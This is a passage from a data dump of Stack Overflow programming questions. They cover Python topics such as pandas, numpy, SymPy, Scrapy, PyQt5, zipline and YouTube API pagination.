   reply= cursor.execute('SELECT respoce FROM Conversation_Engine WHERE request REGEXP?',[New_H]).fetchone()
   if reply:
      B=reply[0]
      new_data(H,B)
</code></pre>

<p>The codes works perfectly in generating and selecting  the replay from the DB , but the problem is when i go back to the chatting_log table in the DB there is no data?</p>

<p>PS: i am using python 3</p>

<p>thank you,</p>
"
40048006,6120835.0,2016-10-14 16:33:53+00:00,2,Iterate over numpy array,"<p>Given the following array:</p>

<pre><code>x = np.array([[0,2,4,5,5.5,6,7],[4,5,6,7,2,3,4]])
</code></pre>

<p>Based on that array I need to create another array that skip the rows unit the value in the first column is >5.</p>

<p>So the result should like like this:</p>

<pre><code>([[5.5,6,7],[2,3,4]])
</code></pre>

<p>Any hints for a simple (and fast) method for that problem?
Thank you very much for your help!</p>
"
39717071,3781180.0,2016-09-27 06:02:16+00:00,2,Using Makefile bash to save the contents of a python file,"<p>For those who are curious as to why I'm doing this: I need specific files in a tar ball - no more, no less. I have to write unit tests for <code>make check</code>, but since I'm constrained to having ""no more"" files, I have to write the check within the <code>make check</code>. In this way, I have to write bash(but I don't want to).</p>

<p>I dislike using bash for unit testing(sorry to all those who like bash. I just dislike it so much that I would rather go with an extremely hacky approach than to write many lines of bash code), so I wrote a python file. I later learned that I have to use bash because of some unknown strict rule. I figured that there was a way to cache the entire content of the python file into a single string in the bash file, so I could take the string literal in bash and write to a python file and then execute it. </p>

<p>I tried the following attempt (in the following script and result, I used another python file that's not unit_test.py, so don't worry if it doesn't actually look like a unit test):</p>

<h2>toStr.py:</h2>

<pre class=""lang-py prettyprint-override""><code>import re

with open(""unit_test.py"", 'r+') as f:
    s = f.read()

s = s.replace(""\n"", ""\\n"")
print(s)
</code></pre>



<p>And then I piped the results out using:</p>

<pre><code>python toStr.py &gt; temp.txt
</code></pre>

<p>It looked something like:</p>

<p><code>#!/usr/bin/env python\n\nimport os\nimport sys\n\n#create number of bytes as specified in the args:\nif len(sys.argv) != 3:\n    print(""We need a correct number of args : 2 [NUM_BYTES][FILE_NAME]."")\n    exit(1)\nn = -1\ntry:\n    n = int(sys.argv[1])\nexcept:\n    print(""Error casting number : "" + sys.argv[1])\n    exit(1)\n\nrand_string = os.urandom(n)\n\nwith open(sys.argv[2], 'wb+') as f:\n    f.write(rand_string)\n    f.flush()\n    f.close()\n\n</code></p>

<p>I tried taking this as a string literal and echoing it into a new file and see whether I could run it as a python file but it failed.</p>

<p><code>echo '{insert that giant string above here}' &gt; new_unit_test.py</code></p>

<p>I wanted to take this statement above and copy it into my ""bash unit test"" file so I can just execute the python file within the bash script.</p>

<p>The resulting file looked exactly like {insert giant string here}. What am I doing wrong in my attempt? Are there other, much easier ways where I can hold a python file as a string literal in a bash script?</p>
"
40048309,5632974.0,2016-10-14 16:52:05+00:00,2,SymPy - Solving for variable in equation,"<p>Is it possible to define an equation and solve a variable in that equation?</p>

<pre><code>D_PWM, Rsense, A = symbols('D_PWM, Rsense, A')

i_out = D_PWM * (A/Rsense)

print i_out

solve(i_out, Rsense)
</code></pre>

<p>Result:</p>

<pre><code>A*D_PWM/Rsense
[]
</code></pre>
"
40076280,3150181.0,2016-10-16 22:41:30+00:00,2,How is numpy pad implemented (for constant value),"<p>I'm trying to implement the numpy pad function in theano for the constant mode. How is it implemented in numpy? Assume that pad values are just 0.</p>

<p>Given an array </p>

<pre><code>a = np.array([[1,2,3,4],[5,6,7,8]])
# pad values are just 0 as indicated by constant_values=0
np.pad(a, pad_width=[(1,2),(3,4)], mode='constant', constant_values=0)
</code></pre>

<p>would return</p>

<pre><code>array([[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
       [0, 0, 0, 1, 2, 3, 4, 0, 0, 0, 0],
       [0, 0, 0, 5, 6, 7, 8, 0, 0, 0, 0],
       [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
       [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]])
</code></pre>

<p>Now if I know the number of dimensions of a beforehand, I can just implement this by creating a new array of the new dimensions filled the pad value and fill in the corresponding elements in this array. But what if I don't know the dimensions of the input array? While I can still infer the dimensions of the output array from the input array, I have no way of indexing it without knowing the number of dimensions in it. Or am I missing something?</p>

<p>That is, if I know that the input dimension is say, 3, then I could do:</p>

<pre><code>zeros_array[pad_width[0][0]:-pad_width[0][1], pad_width[1][0]:-pad_width[1][1], pad_width[2][0]:-pad_width[2][1]] = a
</code></pre>

<p>where zeros array is the new array created with the output dimensions.</p>

<p>But if I don't know the ndim before hand, I cannot do this.</p>
"
40076176,1107049.0,2016-10-16 22:28:45+00:00,2,How to remove data from DataFrame permanently,"<p>After reading CSV data file with:</p>

<pre><code>import pandas as pd  
df = pd.read_csv('data.csv')
print df.shape
</code></pre>

<p>I get DataFrame 99 rows (indexes) long:</p>

<pre><code>(99, 2)
</code></pre>

<p>To cleanup DataFrame I go ahead and apply dropna() method which reduces it to 33 rows:</p>

<pre><code>df = df.dropna()
print df.shape
</code></pre>

<p>which prints:</p>

<pre><code>(33, 2)
</code></pre>

<p>Now when I iterate the columns it prints out all 99 rows like they weren't dropped:</p>

<pre><code>for index, value in df['column1'].iteritems():
    print index
</code></pre>

<p>which gives me this:</p>

<pre><code>0
1
2
.
.
.
97
98
99
</code></pre>

<p>It appears the <code>dropna()</code> simply made the data ""hidden"". That hidden data returns back when I iterate DataFrame. How to assure the dropped data is removed from DataFrame instead just getting hidden?</p>
"
39672514,6873367.0,2016-09-24 04:31:13+00:00,2,error when training im2txt model,"<p>I was trying to train the <code>im2txt</code> model using Tensorflow that I just built from master branch,</p>

<p>I downloaded all the data sets it needed but when I run the training script:</p>

<pre><code>bazel-bin/im2txt/train \ --input_file_pattern=""${MSCOCO_DIR}/train-?????-of-00256"" \ --inception_checkpoint_file=""${INCEPTION_CHECKPOINT}"" \ --train_dir=""${MODEL_DIR}/train"" \ --train_inception=false \ --number_of_steps=1000000
</code></pre>

<p>It shows the following:</p>

<pre><code>Traceback (most recent call last): 
File ""/home/rvl224/models/im2txt/bazel-bin/im2txt/train.runfiles/im2txt/im2txt/train.py"", line 111, in  tf.app.run() 
File ""/home/rvl224/anaconda2/lib/python2.7/site-packages/tensorflow/python/platform/app.py"", line 30, in run sys.exit(main(sys.argv[:1] + flags_passthrough)) 
File ""/home/rvl224/models/im2txt/bazel-bin/im2txt/train.runfiles/im2txt/im2txt/train.py"", line 65, in main model.build() 
File ""/home/rvl224/models/im2txt/bazel-bin/im2txt/train.runfiles/im2txt/im2txt/show_and_tell_model.py"", line 358, in build self.build_inputs() 
File ""/home/rvl224/models/im2txt/bazel-bin/im2txt/train.runfiles/im2txt/im2txt/show_and_tell_model.py"", line 165, in build_inputs image = self.process_image(encoded_image, thread_id=thread_id) 
File ""/home/rvl224/models/im2txt/bazel-bin/im2txt/train.runfiles/im2txt/im2txt/show_and_tell_model.py"", line 119, in process_image image_format=self.config.image_format) 
File ""/home/rvl224/models/im2txt/bazel-bin/im2txt/train.runfiles/im2txt/im2txt/ops/image_processing.py"", line 114, in process_image method=tf.image.ResizeMethod.BILINEAR)
TypeError: resize_images() got an unexpected keyword argument 'new_height'
</code></pre>

<p>Is it a problem related to the function <code>resize_images()</code> or I just done something wrong?</p>

<p>Thanks</p>
"
39716271,2739316.0,2016-09-27 04:58:47+00:00,2,How to log and save file with date and timestamp in Python,"<p>I am trying to log temperature from a DS18B20 sensor using Raspberry Pi 3 via Python code executed from shell.</p>

<p>I want to log temperature with timestamp and then save the file.</p>

<p>What I am doing presently is saving it to a filename entered in the code, but I want to log the file with date and timestamp in filename.</p>

<p><strong>Case 1 :</strong> When I put a filename in the code, then I can append data to the same file over and over, but I can't start a new separate logging without editing the code.</p>

<pre><code>#Writes data to file
def write_temp(temperature):
        with open(""/home/pi/temp.csv"", ""a"") as log:
                log.write(""{0},{1}\n"".format(strftime(""%Y-%m-%d %H:%M:%S""),str(temperature)))
</code></pre>

<p>Problem is that the file is always temp.csv and data gets appended each time.</p>

<p><strong>Case 2</strong>: I tried to get filename from timestamp, but each second a new file is getting generated.</p>

<pre><code>def write_temp(temperature):
        filename1 = strftime(""%Y-%m-%d %H:%M:%S"")
        #filename1 = sys.argv[1]
        with open('%s.csv' % filename1, 'a') as log:
                log.write(""{0},{1}\n"".format(strftime(""%Y-%m-%d %H:%M:%S""),str(temperature)))
</code></pre>

<p>In the above case, I would rather like to have the filename set at the start of logging each time or at the end of logging. I would also like to save the name as Log-<em>DateTime</em> instead of just DateTime. I tried this by doing <code>('""Log-"" + %s.csv' % filename1, 'a')</code> instead of <code>('%s.csv' % filename1, 'a')</code>, but that didn't work out.</p>

<p><strong>Ideal Case:</strong> I want file name to be WORD-<em>DateTime</em>, where WORD is sent as an argument from the command line, as in below:</p>

<pre><code>sudo python TTLogging.py WORD
</code></pre>

<p>Can you point out where I am going wrong? I can share the full code of my work if required since it is a learning exercise.</p>
"
39716210,6284734.0,2016-09-27 04:53:37+00:00,2,pandas series drop when multiindex is not unique,"<p>consider the <code>pd.Series</code> <code>s</code></p>

<pre><code>midx = pd.MultiIndex.from_product([list('ABC'), np.arange(3)])
s = pd.Series(1, midx)
s

A  0    1
   1    1
   2    1
B  0    1
   1    1
   2    1
C  0    1
   1    1
   2    1
dtype: int64
</code></pre>

<p>It is very convenient to use <code>drop</code> to get rid of cross sections.  For example</p>

<pre><code>s.drop('A')

B  0    1
   1    1
   2    1
C  0    1
   1    1
   2    1
dtype: int64
</code></pre>

<p>But if I make the index non-unique</p>

<pre><code>s = s.append(pd.Series(0, pd.MultiIndex.from_tuples([('A', 2)]))).sort_index()
s

A  0    1
   1    1
   2    1
   2    0
B  0    1
   1    1
   2    1
C  0    1
   1    1
   2    1
dtype: int64
</code></pre>

<p>Then the same <code>drop</code> no longer works.</p>

<pre><code>s.drop('A')

A  0    1
   1    1
   2    1
   2    0
B  0    1
   1    1
   2    1
C  0    1
   1    1
   2    1
dtype: int64
</code></pre>

<p>How do I drop like before</p>

<p>The desired result should be (this doesn't work, what does)</p>

<pre><code>s.drop('B')

A  0    1
   1    1
   2    1
   2    0
C  0    1
   1    1
   2    1
dtype: int64
</code></pre>
"
39672696,6130540.0,2016-09-24 04:58:36+00:00,2,Removing a part of HTML before loading a page in WebDriver - Selenium & Python,"<p>I have a script (inside <code>&lt;script&gt;&lt;/script&gt;</code> tags) that is being executed every time I load a page. Is it possible to remove an WebElement before the page being loaded in the WebDriver to prevent that script from executing? </p>

<hr>

<p>I am thinking of something in the lines of:</p>

<p>Somehow get the raw <strong>HTML</strong> code (perhaps get source or something), remove the part (with selenium or parser), ""inject"" the edited code back into Selenium (Firefox WebDriver or maybe PhantomJS) and finally execute it for all pages on that website.</p>

<p>Is it possible to do that or is this perhaps impossible by design?</p>
"
39715429,741099.0,2016-09-27 03:16:18+00:00,2,Using XPath with Scrapy,"<p>I am new to using Scrapy and is trying get all the URLs of the listings on the page using Xpath.</p>

<p>The first xpath works</p>

<pre><code>sel.xpath('//[contains(@class, ""attraction_element"")]')
</code></pre>

<p>but the second xpath is giving an error</p>

<pre><code>get_parsed_string(snode_attraction, '//[@class=""property_title""]/a/@href')
</code></pre>

<p>What is wrong and how can we fix it?</p>

<p><strong>Scrapy Code</strong></p>

<pre><code>def clean_parsed_string(string):
    if len(string) &gt; 0:
        ascii_string = string
        if is_ascii(ascii_string) == False:
            ascii_string = unicodedata.normalize('NFKD', ascii_string).encode('ascii', 'ignore')
        return str(ascii_string)
    else:
        return None


def get_parsed_string(selector, xpath):
    return_string = ''
    extracted_list = selector.xpath(xpath).extract()
    if len(extracted_list) &gt; 0:
        raw_string = extracted_list[0].strip()
        if raw_string is not None:
            return_string = htmlparser.unescape(raw_string)
    return return_string


class TripAdvisorSpider(Spider):
    name = 'tripadvisor'

    allowed_domains = [""tripadvisor.com""]
    base_uri = ""http://www.tripadvisor.com""
    start_urls = [
        base_uri + '/Attractions-g155032-Activities-c47-t163-Montreal_Quebec.html'
    ]


    # Entry point for BaseSpider
    def parse(self, response):

        tripadvisor_items = []

        sel = Selector(response)
        snode_attractions = sel.xpath('//[contains(@class, ""attraction_element"")]')

        # Build item index
        for snode_attraction in snode_attractions:
            print clean_parsed_string(get_parsed_string(snode_attraction, '//[@class=""property_title""]/a/@href'))
</code></pre>
"
40075106,7027975.0,2016-10-16 20:28:05+00:00,2,Replace values in pandas Series with dictionary,"<p>I want to replace values in a pandas <code>Series</code> using a dictionary. I'm following @DSM's <a href=""http://stackoverflow.com/questions/20250771/remap-values-in-pandas-column-with-a-dict"">accepted answer</a> like so:</p>

<pre><code>s = Series(['abc', 'abe', 'abg'])
d = {'b': 'B'}
s.replace(d)
</code></pre>

<p>But this has no affect:</p>

<pre><code>0    abc
1    abe
2    abg
dtype: object
</code></pre>

<p>The <a href=""http://nipy.bic.berkeley.edu/nightly/pandas/doc/generated/pandas.Series.replace.html"" rel=""nofollow"">documentation</a> explains the required format of the dict for <code>DataFrames</code> (i.e. nested dicts with top level keys corresponding to column names) but I can't see anything specific for <code>Series</code>.</p>
"
40074739,4709746.0,2016-10-16 19:51:29+00:00,2,How to get mean of rows selected with another column's values in pandas,"<p>I am trying to get calculate the mean for Score 1 only if column <code>Dates</code> is equal to <code>Oct-16</code>:</p>

<p><a href=""https://i.stack.imgur.com/PR8jf.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/PR8jf.png"" alt=""enter image description here""></a></p>

<p>What I originally tried was:</p>

<pre><code> import pandas as pd
 import numpy as np
 import os

 dataFrame = pd.read_csv(""test.csv"")

 for date in dataFrame[""Dates""]:
    if date == ""Oct-16"":
        print(date)##Just checking
        print(dataFrame[""Score 1""].mean())
</code></pre>

<p>But my results are the mean for the whole column <code>Score 1</code></p>

<p>Another thing I tried was manually telling it which indices to calculate the mean for:</p>

<pre><code>dataFrame[""Score 1""].iloc[0:2].mean()
</code></pre>

<p>But ideally I would like to find a way to do it if <code>Dates == ""Oct-16""</code>.</p>
"
39715121,4260991.0,2016-09-27 02:30:19+00:00,2,How do I access each element in list in for-loop operations?,"<p>I am looping through this list and don't understand why <code>print(d)</code> returns each number in <code>seed</code> but assigning <code>i[""seed""] = d</code> assigns the last element of <code>seed</code>.</p>

<p>How do I access each element in <code>seed</code> for operations other than <code>print()</code>?</p>

<pre><code>res = []
seed = [1, 2, 3, 4, 5, 6, 7, 8, 9]
i = {}
for d in seed:
    print(d)
    i[""seed""] = d
    res.append(i)
print(res)
</code></pre>

<p>Thanks!</p>
"
40074637,1820665.0,2016-10-16 19:40:10+00:00,2,PyQt5 port: how do I hide a window and let it appear at the same position,"<p>I'm porting a PyQt4 program to PyQt5. One part of it is hiding the window, taking a screenshot of the area behind the window and showing the window again, which worked just fine with PyQt4.</p>

<p>With my PyQt5 port, everything works fine, but the window appears on the position where it was when the program was started, and not at the position where it was before calling the hide() method.</p>

<p>I'm testing this on a Linux box. The relevant code strips down to:</p>

<pre><code>import sys
from PyQt5.QtCore import QTimer
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget,
                             QGridLayout, QPushButton)

class demo(QMainWindow):

    def __init__(self):
        super().__init__()

        mainWidget = QWidget(self)
        layout = QGridLayout(mainWidget)
        self.setCentralWidget(mainWidget)

        self.testButton = QPushButton(self)
        self.testButton.setText('Test')
        self.testButton.clicked.connect(self.hideMe)
        layout.addWidget(self.testButton, 0, 0)

    def hideMe(self):
        self.hide()
        QTimer.singleShot(300, self.showMe)

    def showMe(self):
        self.show()
        self.move(self.pos())

app = QApplication(sys.argv)
mainWindow = demo()
mainWindow.show()
sys.exit(app.exec_())
</code></pre>

<p>In showMe(), self.pos() actually contains the right coordinates, but the window isn't moved there (but to it's ""original"" position it had right after starting).</p>

<p>When I e. g. do a self.move(10, 10) instead, the window is actually moved there. But as soon as I use a variable (I also tried to save the x and y of self.pos in a variable and to use this instead) the window is shown at the position it had after starting.</p>

<p>Why does a move() call with integers actually move the window, but a move() call with variables doesn't? How do I move the window to the position it had before hiding?</p>

<p>Thanks for all help!</p>

<p>Edit (perhaps to find out what's the difference):</p>

<p>The very same code using PyQt4 works:</p>

<pre><code>import sys

from PyQt4.QtCore import QTimer
from PyQt4.QtGui import (QApplication, QMainWindow, QWidget,
                         QGridLayout, QPushButton)

class demo(QMainWindow):

    def __init__(self):
        super().__init__()

        mainWidget = QWidget(self)
        layout = QGridLayout(mainWidget)
        self.setCentralWidget(mainWidget)

        self.testButton = QPushButton(self)
        self.testButton.setText('Test')
        self.testButton.clicked.connect(self.hideMe)
        layout.addWidget(self.testButton, 0, 0)

    def hideMe(self):
        self.hide()
        QTimer.singleShot(300, self.showMe)

    def showMe(self):
        self.show()
        self.move(self.pos())

app = QApplication(sys.argv)
mainWindow = demo()
mainWindow.show()
sys.exit(app.exec_())
</code></pre>

<p>so why behaves Qt5 different to Qt4 in this case?</p>
"
39674876,3510736.0,2016-09-24 09:40:47+00:00,2,Is There Complete Overlap Between `pd.pivot_table` and `pd.DataFrame.groupby` + `pd.DataFrame.unstack`?,"<p>(Please note that there's a question <a href=""http://stackoverflow.com/questions/34702815/pandas-group-by-and-pivot-table-difference"">Pandas: group by and Pivot table difference</a>, but this question is different.)</p>

<p>Suppose you start with a DataFrame</p>

<pre><code>df = pd.DataFrame({'a': ['x'] * 2 + ['y'] * 2, 'b': [0, 1, 0, 1], 'val': range(4)})
&gt;&gt;&gt; df
Out[18]: 
   a  b  val
0  x  0    0
1  x  1    1
2  y  0    2
3  y  1    3
</code></pre>

<p>Now suppose you want to make the index <code>a</code>, the columns <code>b</code>, the values in a cell <code>val</code>, and specify what to do if there are two or more values in a resulting cell:</p>

<pre><code>b  0  1
a      
x  0  1
y  2  3
</code></pre>

<p>Then you can do this either through</p>

<pre><code>df.val.groupby([df.a, df.b]).sum().unstack()
</code></pre>

<p>or through</p>

<pre><code>pd.pivot_table(df, index='a', columns='b', values='val', aggfunc='sum')
</code></pre>

<p>So it seems to me that there's a simple correspondence between correspondence between the two (given one, you could almost write a script to transform it into the other). I also thought of more complex cases with hierarchical indices / columns, but I still see no difference.</p>

<p>Is there something I've missed? </p>

<ul>
<li><p>Are there operations that can be performed using one and not the other? </p></li>
<li><p>Ar there, perhaps, operations easier to perform using one over the other? </p></li>
<li><p>If not, why not deprecate <code>pivot_tale</code>? <code>groupby</code> seems much more general.</p></li>
</ul>
"
40074425,741099.0,2016-10-16 19:19:42+00:00,2,Zipline Error: AttributeError: 'NoneType' object has no attribute 'fetch_csv',"<p>I just installed Zipline on Windows 10, Python 2.7 system using <code>conda</code>. When I <a href=""http://www.zipline.io/appendix.html?highlight=fetch_csv#zipline.api.fetch_csv"" rel=""nofollow"">tried to use a function <code>fetch_csv</code> from <code>zipline.api</code></a>, I get an error</p>

<pre><code>AttributeError: 'NoneType' object has no attribute 'fetch_csv'
</code></pre>

<p>Why can't I load the function <code>fetch_csv</code>?</p>

<pre><code>from zipline.api import fetch_csv

fetch_csv('./test.csv')
</code></pre>
"
40074385,7020773.0,2016-10-16 19:14:55+00:00,2,Python Split Variable Output to Multiple Variables,"<p>First, I apologize for my ignorance here as I'm very new to Python and I may say things that really don't make sense.</p>

<p>I'm using the <code>youtube.search.list</code> API to create a variable <code>search_response</code>. This variable outputs the data on all searched videos in JSON format (I believe it's JSON anyways).</p>

<p>The search API is limited to 50 results per page but I've been able to use pagination to return up to 550 results (which is adequate for what I'm doing).</p>

<p>The <code>search.list</code> only provides me with details like the video title, date posted, video ID, etc. However, I'm hoping to access the view, like, and dislike counts for each video as well.</p>

<p>Using the <code>videos.list</code> API I have been able to pull in these variables (view, like, dislike) but it seems to be capped at 50 results as well and provides no pagination option.</p>

<p><a href=""https://drive.google.com/open?id=0B-CXsNw4ZWO0Mm80clJqbDg3dkk"" rel=""nofollow"">Here is a link</a> to the file in Jupyter Notebook (also attaching in .py).</p>

<p>So I'm thinking that if I can separate the JSON file (<code>search_response</code>) into segments of 50 posts I should be to run it 10 times and download views, likes, and dislikes for all videos. However, I have no idea how to separate the output of my <code>search_response</code> variable and appreciate any thoughts or suggestions on this!</p>

<p><strong>To summarize this issue:</strong></p>

<ul>
<li>I have a variable <code>search_response</code> outputting, in JSON format, hundreds of individual sections (one for each video)</li>
<li>The <code>videos.list</code> API to gather detailed stats (view, dis/like count) has a limit of 50 requests</li>
<li>I'm looking for a way to separate the <code>search_response</code> output into multiple variables of 50 sections each to run individually in the API</li>
</ul>

<p><strong>Code Used:</strong>
<em>Gather Data</em></p>

<pre><code>from apiclient.discovery import build
from apiclient.errors import HttpError
from oauth2client.tools import argparser

DEVELOPER_KEY = ""REPLACE ME""
YOUTUBE_API_SERVICE_NAME = ""youtube""
YOUTUBE_API_VERSION = ""v3""

def fetch_all_youtube_videos(channelId):

youtube = build(YOUTUBE_API_SERVICE_NAME,
                YOUTUBE_API_VERSION,
                developerKey=DEVELOPER_KEY)
res = youtube.search().list(
q="""",
part=""id,snippet"",
channelId=channelId,
maxResults=50,
).execute()

nextPageToken = res.get('nextPageToken')
while ('nextPageToken' in res):
    nextPage = youtube.search().list(
    part=""id,snippet"",
    channelId=channelId,
    maxResults=""50"",
    pageToken=nextPageToken
    ).execute()
    res['items'] = res['items'] + nextPage['items']

    if 'nextPageToken' not in nextPage:
        res.pop('nextPageToken', None)
    else:
        nextPageToken = nextPage['nextPageToken']

return res

if __name__ == '__main__':
search_response = fetch_all_youtube_videos(""UCp0hYYBW6IMayGgR-WeoCvQ"")

videos = []   

for search_result in search_response.get(""items"", []):
if search_result[""id""][""kind""] == ""youtube#video"":
    videos.append(""%s (%s)"" % (search_result[""snippet""][""title""],
                             search_result[""id""][""videoId""]))
</code></pre>

<p><strong>Code Used:</strong>
<em>Add Detailed Stats</em></p>

<pre><code>youtube = build(YOUTUBE_API_SERVICE_NAME, YOUTUBE_API_VERSION, developerKey=DEVELOPER_KEY)

videos = {}

for search_result in search_response.get(""items"", []):
if search_result[""id""][""kind""] == ""youtube#video"":
    videos[search_result[""id""][""videoId""]] = search_result[""snippet""][""title""]

video_ids_list = ','.join(videos.keys())

video_list_stats = youtube.videos().list(
 id=video_ids_list,
 part='id,statistics'
).execute()
</code></pre>

<p><strong>Ideal Output:</strong><em>This output corresponds to the first 50 etag sections (only have 25 or so displayed here because of character limits on this website but should be 50 sections) of the</em> <code>search_response</code> <em>variable and could be called</em> <code>search_response1</code> <em>where</em> <code>search_response2</code> <em>could encompass etag sections 51-100 and so on.</em></p>

<pre><code>    search_response1 = {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/hsQmFEqp1R_glFpcQnpnOLbbxCg""',
   'id': {'kind': 'youtube#video', 'videoId': 'd8kCTPPwfpM'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""This incredible duo teamed up to perform an original song for Ellen! They may not have had a lot of rehearsal, but it's clear that this is one musical combo it ..."",
    'liveBroadcastContent': 'none',
    'publishedAt': '2012-02-21T14:00:00.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/d8kCTPPwfpM/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/d8kCTPPwfpM/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/d8kCTPPwfpM/mqdefault.jpg',
      'width': 320}},
    'title': 'Taylor Swift and Zac Efron Sing a Duet!'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/LeKypRrnWWD6mRhK1wATZB5UQGo""',
   'id': {'kind': 'youtube#video', 'videoId': '-l2KPjQ2lJA'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Harry, Liam, Louis and Niall played a round of Ellen's revealing game. How well do you know the guys of One Direction?"",
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-11-18T14:00:00.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/-l2KPjQ2lJA/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/-l2KPjQ2lJA/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/-l2KPjQ2lJA/mqdefault.jpg',
      'width': 320}},
    'title': 'Never Have I Ever with One Direction'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/qm7jX3gngQBYS7xv9sROxTpUtDU""',
   'id': {'kind': 'youtube#video', 'videoId': 'Jr7bRw0NxQ4'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Ellen has always loved giving her guests a good thrill, and she put together this montage of some of her favorite scares from over the years!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-11-19T14:00:00.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/Jr7bRw0NxQ4/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/Jr7bRw0NxQ4/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/Jr7bRw0NxQ4/mqdefault.jpg',
      'width': 320}},
    'title': ""Ellen's Never-Ending Scares""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/dWDEID-z2CI4P-eh62pmTxWq0uc""',
   'id': {'kind': 'youtube#video', 'videoId': 't5jw3T3Jy70'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Kristen Bell loves sloths. You might even say she's obsessed with them. She told Ellen about what happened when her boyfriend, Dax Shepard, introduced her ..."",
    'liveBroadcastContent': 'none',
    'publishedAt': '2012-01-31T03:18:55.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/t5jw3T3Jy70/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/t5jw3T3Jy70/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/t5jw3T3Jy70/mqdefault.jpg',
      'width': 320}},
    'title': ""Kristen Bell's Sloth Meltdown""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/ZSOfmz-dGZ3R0LNJ2n1LLQ4hEjg""',
   'id': {'kind': 'youtube#video', 'videoId': 'fC_Z5HlK9Pw'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""The two incredibly handsome and talented stars got hilariously honest while playing one of Ellen's favorite games."",
    'liveBroadcastContent': 'none',
    'publishedAt': '2016-05-18T13:00:04.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/fC_Z5HlK9Pw/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/fC_Z5HlK9Pw/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/fC_Z5HlK9Pw/mqdefault.jpg',
      'width': 320}},
    'title': 'Drake and Jared Leto Play Never Have\xa0I\xa0Ever'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/M9siwkGRaHrf5ELg2R1JceH2KmA""',
   'id': {'kind': 'youtube#video', 'videoId': '4aKteL3vMvU'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'The amazing Adele belted out her hit song for the first time since her Grammy performance.',
    'liveBroadcastContent': 'none',
    'publishedAt': '2016-02-18T14:00:00.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/4aKteL3vMvU/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/4aKteL3vMvU/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/4aKteL3vMvU/mqdefault.jpg',
      'width': 320}},
    'title': ""Adele Performs\xa0'All\xa0I\xa0Ask'""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/od24uJeVxDWErhRWWtsSKHuD9oQ""',
   'id': {'kind': 'youtube#video', 'videoId': 'WOgKIlvjlQ8'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Ellen, Johnny Depp, Gwyneth Paltrow and Paul Bettany all played an incredibly revealing round of ""Never Have I Ever."" You won\'t believe what they revealed!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-01-23T14:00:13.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/WOgKIlvjlQ8/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/WOgKIlvjlQ8/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/WOgKIlvjlQ8/mqdefault.jpg',
      'width': 320}},
    'title': 'Never Have I Ever'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/Wu5vxAyQ5QGl6uO7eIodYHjaqVI""',
   'id': {'kind': 'youtube#video', 'videoId': '07nXzFPHiGU'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
